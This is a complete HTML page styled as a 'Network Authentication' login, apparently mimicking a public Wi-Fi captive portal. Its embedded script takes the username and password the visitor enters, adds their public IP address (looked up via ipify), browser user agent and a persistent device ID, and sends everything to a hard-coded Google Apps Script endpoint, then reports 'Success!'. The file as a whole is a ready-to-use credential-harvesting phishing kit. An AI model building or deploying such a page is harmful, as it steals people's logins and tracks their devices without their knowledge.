<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Network Authentication Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      border: 1px solid #ddd;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 30px;
      width: 320px;
    }
    h2 {
      text-align: center;
      color: #00704a;
      margin-bottom: 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #00704a;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #005c3a;
    }
    #response {
      text-align: center;
      margin-top: 15px;
      color: red;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Network Authentication</h2>
    <form id="authForm">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
    <div id="response"></div>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzdnme2wJ3yraQkfeslYEbapcaHXZETLmbibHEUBVESaHHRAeUM6F48T-H1CX11G5HA/exec'; // <---- paste your Google Script URL here
    const form = document.getElementById('authForm');
    const responseEl = document.getElementById('response');

    async function getUserIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        return 'Unavailable';
      }
    }

    function getDeviceID() {
      let id = localStorage.getItem('deviceID');
      if (!id) {
        id = crypto.randomUUID();
        localStorage.setItem('deviceID', id);
      }
      return id;
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      responseEl.textContent = 'Submitting...';

      const formData = new FormData(form);
      const ip = await getUserIP();
      const userAgent = navigator.userAgent;
      const deviceID = getDeviceID();

      formData.append('ip', ip);
      formData.append('userAgent', userAgent);
      formData.append('deviceID', deviceID);

      try {
        const res = await fetch(scriptURL, {
          method: 'POST',
          body: formData,
        });

        if (res.ok) {
          responseEl.style.color = 'green';
          responseEl.textContent = 'Success!';
          form.reset();
        } else {
          throw new Error('Network response not ok');
        }
      } catch (err) {
        responseEl.style.color = 'red';
        responseEl.textContent = 'Error: Load failed';
        console.error(err);
      }
    });
  </script>
</body>
</html>
